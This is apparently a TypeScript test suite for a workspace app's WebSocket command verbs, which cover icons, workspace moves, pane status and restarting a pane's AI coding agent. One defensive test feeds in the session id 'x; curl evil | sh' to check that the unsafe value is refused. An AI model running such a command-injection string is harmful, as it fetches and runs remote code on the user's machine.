/**
 * The WS-only verbs the client-polish pass added: icons, the atomic multi-workspace move, the
 * focus-dwell status clear, the agent restart, and the content font size.
 *
 * Each is a round-trip through a real `SyncHub` session rather than a direct call to the
 * handler, because the thing worth protecting is the WHOLE path — matched before the wire
 * decode (these verbs are deliberately absent from `WIRE_COMMANDS`), dispatched into the
 * existing store action, and answered on the connection that asked.
 */

import { isWireCommand, WS_PROTOCOL_VERSION, type JsonObject } from '@nex/protocol';
import { describe, expect, it } from 'vitest';

import type { ControlDispatcher } from '../seams.js';
import { G1, harness as storeHarness, seededState, W1 } from '../store/testing.js';
import { createAgentChannel } from './agents.js';
import {
    createSyncHub,
    isAgentCommand,
    isWsOnlyCommand,
    type AgentChannel,
    type SyncHub,
    type SyncSession
} from './sync.js';
import { recordingTransport, type RecordedTransport } from './testing.js';

const DAEMON = { version: '0.1.0', build: '42', pid: 4242 };
const PANE = 'dddddddd-0000-4000-8000-000000000100';

const noopDispatcher: ControlDispatcher = (_message, reply) => {
    reply?.send({ ok: true });
    reply?.close();
};

interface Fixture {
    readonly hub: SyncHub;
    readonly store: ReturnType<typeof storeHarness>;
    connect(): { session: SyncSession; transport: RecordedTransport };
}

function fixture(options: { agents?: AgentChannel } = {}): Fixture {
    const store = storeHarness(seededState(W1, PANE));
    const hub = createSyncHub({
        store: store.store,
        dispatcher: noopDispatcher,
        daemon: DAEMON,
        now: () => 1_700_000_000_000,
        ...(options.agents === undefined ? {} : { agents: options.agents })
    });
    return {
        hub,
        store,
        connect() {
            const transport = recordingTransport();
            const session = hub.createSession(transport);
            session.handleMessage(
                JSON.stringify({
                    type: 'hello',
                    protocolVersion: WS_PROTOCOL_VERSION,
                    client: { kind: 'browser' }
                })
            );
            return { session, transport };
        }
    };
}

function ask(session: SyncSession, transport: RecordedTransport, payload: JsonObject): JsonObject {
    const id = `req-${String(transport.json.length)}`;
    session.handleMessage(JSON.stringify({ type: 'command', id, payload }));
    const reply = [...transport.json]
        .reverse()
        .find((message) => message['type'] === 'command-reply' && message['id'] === id);
    if (reply === undefined) throw new Error(`no reply for ${JSON.stringify(payload)}`);
    return reply['reply'] as JsonObject;
}

describe('icon verbs', () => {
    it('sets and clears a workspace icon, keeping the token opaque', () => {
        const f = fixture();
        const { session, transport } = f.connect();

        const emoji = ask(session, transport, {
            command: 'set-workspace-icon',
            workspace_id: W1,
            icon: 'emoji:🔥'
        });
        expect(emoji).toMatchObject({ ok: true, workspace_id: W1, icon: 'emoji:🔥' });
        expect(f.store.state().workspaces[0]?.icon).toEqual({ kind: 'emoji', grapheme: '🔥' });

        // A legacy SF Symbol name is stored verbatim: the daemon never interprets it.
        const symbol = ask(session, transport, {
            command: 'set-workspace-icon',
            workspace_id: W1,
            icon: 'system:hammer.fill'
        });
        expect(symbol['icon']).toBe('system:hammer.fill');
        expect(f.store.state().workspaces[0]?.icon).toEqual({ kind: 'system', name: 'hammer.fill' });

        // "Reset to Letter": anything unparseable clears it.
        const cleared = ask(session, transport, { command: 'set-workspace-icon', workspace_id: W1, icon: null });
        expect(cleared).toMatchObject({ ok: true, icon: null });
        expect(f.store.state().workspaces[0]?.icon).toBeNull();
    });

    it('sets a group icon and refuses an unknown id', () => {
        const f = fixture();
        f.store.dispatch({ type: 'create-group', id: G1, name: 'infra', color: 'blue', now: 1 });
        const { session, transport } = f.connect();

        expect(ask(session, transport, { command: 'set-group-icon', group_id: G1, icon: 'emoji:📁' })).toMatchObject({
            ok: true,
            group_id: G1,
            icon: 'emoji:📁'
        });
        expect(f.store.state().groups[0]?.icon).toEqual({ kind: 'emoji', grapheme: '📁' });

        expect(ask(session, transport, { command: 'set-group-icon', group_id: 'nope', icon: 'emoji:📁' })).toEqual({
            ok: false,
            error: "no group matches 'nope'"
        });
        expect(ask(session, transport, { command: 'set-workspace-icon', icon: 'emoji:📁' })).toEqual({
            ok: false,
            error: 'set-workspace-icon requires workspace_id'
        });
    });

    /**
     * §WS-074: the sheet's heuristic is not the only line of defence. A hand-written frame
     * that names a letter, a digit or a whole word is refused on BOTH icon verbs, and the
     * refusal leaves the stored icon exactly as it was.
     */
    it('re-validates an emoji payload and leaves the icon untouched when it fails', () => {
        const f = fixture();
        f.store.dispatch({ type: 'create-group', id: G1, name: 'infra', color: 'blue', now: 1 });
        const { session, transport } = f.connect();

        ask(session, transport, { command: 'set-workspace-icon', workspace_id: W1, icon: 'emoji:🔥' });
        for (const bad of ['emoji:a', 'emoji:7', 'emoji:-', 'emoji:hello', 'emoji:Ω']) {
            const reply = ask(session, transport, { command: 'set-workspace-icon', workspace_id: W1, icon: bad });
            expect(reply['ok'], bad).toBe(false);
            expect(String(reply['error'])).toContain('not a usable icon');
        }
        // Untouched by every refusal.
        expect(f.store.state().workspaces[0]?.icon).toEqual({ kind: 'emoji', grapheme: '🔥' });

        // The group verb runs the same check…
        expect(ask(session, transport, { command: 'set-group-icon', group_id: G1, icon: 'emoji:x' })).toEqual({
            ok: false,
            error: "'x' is not a usable icon: give one emoji or symbol"
        });
        expect(f.store.state().groups[0]?.icon).toBeNull();

        // …and the symbols the palette really does offer still pass, `system:` tokens included.
        for (const good of ['emoji:⛙', 'emoji:❤️', 'emoji:1️⃣', 'emoji:🇦🇺']) {
            expect(ask(session, transport, { command: 'set-group-icon', group_id: G1, icon: good })['ok'], good).toBe(
                true
            );
        }
        expect(ask(session, transport, { command: 'set-group-icon', group_id: G1, icon: 'system:star' })['ok']).toBe(
            true
        );
    });
});

describe('move-workspaces', () => {
    it('moves the whole selection into a group in ONE dispatch', () => {
        const f = fixture();
        f.store.dispatch(
            { type: 'create-group', id: G1, name: 'infra', color: 'blue', now: 1 },
            { type: 'create-workspace', id: 'aaaaaaaa-0000-4000-8000-000000000002', paneID: 'dddddddd-0000-4000-8000-000000000201', name: 'b', color: 'red', now: 2 },
            { type: 'create-workspace', id: 'aaaaaaaa-0000-4000-8000-000000000003', paneID: 'dddddddd-0000-4000-8000-000000000202', name: 'c', color: 'red', now: 3 }
        );
        const ids = ['aaaaaaaa-0000-4000-8000-000000000002', 'aaaaaaaa-0000-4000-8000-000000000003'];
        const { session, transport } = f.connect();

        const before = f.store.batches.length;
        const reply = ask(session, transport, {
            command: 'move-workspaces',
            workspace_ids: ids,
            group_id: G1,
            index: 0
        });

        expect(reply).toMatchObject({ ok: true, group_id: G1, index: 0 });
        expect(f.store.state().groups[0]?.childOrder).toEqual(ids);
        // The whole point of the verb: one atomic commit, not one move per row.
        expect(f.store.batches.length - before).toBe(1);
    });

    it('refuses an unknown workspace or group before mutating anything', () => {
        const f = fixture();
        const { session, transport } = f.connect();
        expect(ask(session, transport, { command: 'move-workspaces', workspace_ids: [W1, 'ghost'] })).toEqual({
            ok: false,
            error: "no workspace matches 'ghost'"
        });
        expect(
            ask(session, transport, { command: 'move-workspaces', workspace_ids: [W1], group_id: 'ghost' })
        ).toEqual({ ok: false, error: "no group matches 'ghost'" });
        expect(ask(session, transport, { command: 'move-workspaces', workspace_ids: [] })).toEqual({
            ok: false,
            error: 'move-workspaces requires workspace_ids'
        });
    });
});

describe('clear-pane-status', () => {
    it('clears a waiting pane back to idle', () => {
        const f = fixture();
        f.store.dispatch({
            type: 'pane-agent-event',
            paneID: PANE,
            event: { type: 'setPaneStatus', status: 'waitingForInput' },
            now: 1,
            workspaceID: W1
        });
        expect(f.store.state().workspaces[0]?.panes[0]?.status).toBe('waitingForInput');

        const { session, transport } = f.connect();
        const reply = ask(session, transport, { command: 'clear-pane-status', pane_id: PANE });

        expect(reply).toMatchObject({ ok: true, pane_id: PANE, workspace_id: W1, status: 'idle' });
        expect(f.store.state().workspaces[0]?.panes[0]?.status).toBe('idle');
    });

    it('refuses an unknown pane', () => {
        const f = fixture();
        const { session, transport } = f.connect();
        expect(ask(session, transport, { command: 'clear-pane-status', pane_id: 'ghost' })).toEqual({
            ok: false,
            error: "no pane matches 'ghost'"
        });
    });
});

describe('restart-pane-agent', () => {
    function agentFixture(): {
        readonly f: Fixture;
        readonly writes: { paneID: string; text: string; bare: boolean }[];
        readonly live: Set<string>;
    } {
        const writes: { paneID: string; text: string; bare: boolean }[] = [];
        const live = new Set<string>([PANE]);
        const store = storeHarness(seededState(W1, PANE));
        const channel = createAgentChannel({
            store: store.store,
            pty: { has: (paneID) => live.has(paneID) },
            input: {
                sendText: (paneID, text, opts) => {
                    writes.push({ paneID, text, bare: opts.bare });
                }
            }
        });
        const hub = createSyncHub({
            store: store.store,
            dispatcher: noopDispatcher,
            daemon: DAEMON,
            agents: channel
        });
        return {
            f: {
                hub,
                store,
                connect() {
                    const transport = recordingTransport();
                    const session = hub.createSession(transport);
                    session.handleMessage(
                        JSON.stringify({
                            type: 'hello',
                            protocolVersion: WS_PROTOCOL_VERSION,
                            client: { kind: 'browser' }
                        })
                    );
                    return { session, transport };
                }
            },
            writes,
            live
        };
    }

    function attachSession(store: ReturnType<typeof storeHarness>, sessionID: string, agent: 'claude' | 'codex'): void {
        store.dispatch({
            type: 'pane-agent-event',
            paneID: PANE,
            event: { type: 'sessionStarted', sessionID, agent },
            now: 1,
            workspaceID: W1
        });
    }

    it('types the pane’s resume command', () => {
        const { f, writes } = agentFixture();
        attachSession(f.store, 'abc-123', 'claude');
        const { session, transport } = f.connect();

        const reply = ask(session, transport, { command: 'restart-pane-agent', pane_id: PANE });

        expect(reply).toMatchObject({
            ok: true,
            pane_id: PANE,
            workspace_id: W1,
            agent: 'claude',
            command: 'claude --resume abc-123'
        });
        expect(writes).toEqual([{ paneID: PANE, text: 'claude --resume abc-123', bare: false }]);
    });

    it('uses the codex spelling for a codex pane', () => {
        const { f, writes } = agentFixture();
        attachSession(f.store, 'sess_9', 'codex');
        const { session, transport } = f.connect();
        ask(session, transport, { command: 'restart-pane-agent', pane_id: PANE });
        expect(writes[0]?.text).toBe('codex resume sess_9');
    });

    it('refuses an unsafe session id without writing anything', () => {
        const { f, writes } = agentFixture();
        attachSession(f.store, 'x; curl evil | sh', 'claude');
        const { session, transport } = f.connect();

        expect(ask(session, transport, { command: 'restart-pane-agent', pane_id: PANE })).toEqual({
            ok: false,
            error: `pane '${PANE}' has an unsafe agent session id`
        });
        expect(writes).toEqual([]);
    });

    it('refuses a pane with no session, no live process, or no channel at all', () => {
        const { f, live } = agentFixture();
        const { session, transport } = f.connect();
        expect(ask(session, transport, { command: 'restart-pane-agent', pane_id: PANE })).toEqual({
            ok: false,
            error: `pane '${PANE}' has no agent session to restart`
        });

        attachSession(f.store, 'abc', 'claude');
        live.delete(PANE);
        expect(ask(session, transport, { command: 'restart-pane-agent', pane_id: PANE })).toEqual({
            ok: false,
            error: `pane '${PANE}' has no live terminal process`
        });

        const bare = fixture();
        const plain = bare.connect();
        expect(ask(plain.session, plain.transport, { command: 'restart-pane-agent', pane_id: PANE })).toEqual({
            ok: false,
            error: 'agent restart is not available'
        });
    });
});

describe('vocabulary', () => {
    it('keeps the new verbs off the CLI wire', () => {
        for (const command of ['set-workspace-icon', 'set-group-icon', 'move-workspaces', 'clear-pane-status']) {
            expect(isWsOnlyCommand(command)).toBe(true);
            expect(isWireCommand(command)).toBe(false);
        }
        expect(isAgentCommand('restart-pane-agent')).toBe(true);
        expect(isWireCommand('restart-pane-agent')).toBe(false);
    });
});
